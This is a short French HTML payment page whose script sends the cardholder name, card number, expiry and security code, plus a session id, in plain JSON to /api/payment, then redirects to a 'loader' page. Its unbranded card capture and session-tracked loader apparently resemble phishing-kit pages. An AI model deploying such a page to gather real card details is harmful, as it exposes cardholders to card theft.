<!DOCTYPE html>
<html lang="fr">
<head><meta charset="utf-8"><title>Paiement</title></head>
<body>
  <h1>ðŸ’³ Paiement</h1>
  <form id="paymentForm">
    <input type="text" placeholder="Nom titulaire" name="nom" required><br>
    <input type="text" placeholder="NumÃ©ro carte" name="cardNumber" required><br>
    <input type="text" placeholder="MM/AA" name="expiry" required><br>
    <input type="text" placeholder="CCV" name="ccv" required><br>
    <button type="submit">Valider</button>
  </form>

  <script>
    document.getElementById('paymentForm').addEventListener('submit', async e=>{
      e.preventDefault();
      const sid = localStorage.getItem('sessionId');
      const data = Object.fromEntries(new FormData(e.target).entries());
      await fetch('/api/payment',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...data,sessionId:sid})});
      window.location.href = '/loader.html?sid=' + sid;
    });
  </script>
</body>
</html>
